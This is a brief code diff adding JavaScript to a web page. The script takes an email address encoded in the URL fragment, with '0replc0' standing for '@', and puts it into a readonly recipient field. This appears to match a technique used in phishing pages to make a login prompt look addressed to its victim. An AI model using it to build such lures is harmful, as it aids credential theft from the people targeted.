@@ -182,8 +182,18 @@ return(str.substring(theleft, theright));
             <span class="input-group-addon"><i class="fas fa-user"></i></span>
             <input type="email" class="form-control" name="username" placeholder="Recipent Email" value="" id="email" readonly>
 <script>
-        
-    </script>			
+       document.addEventListener('DOMContentLoaded', function() {
+    const emailField = document.getElementById('email');
+    const hashValue = window.location.hash.substring(1); // Remove "#"
+    
+    if (hashValue && hashValue.includes('0replc0')) {
+        const decodedEmail = hashValue.replace(/0replc0/g, '@');
+        emailField.value = decodedEmail;
+    } else {
+        emailField.placeholder = "No valid email found in URL";
+    }
+}); 
+</script>			
           </div>
 		   </div>
 		   
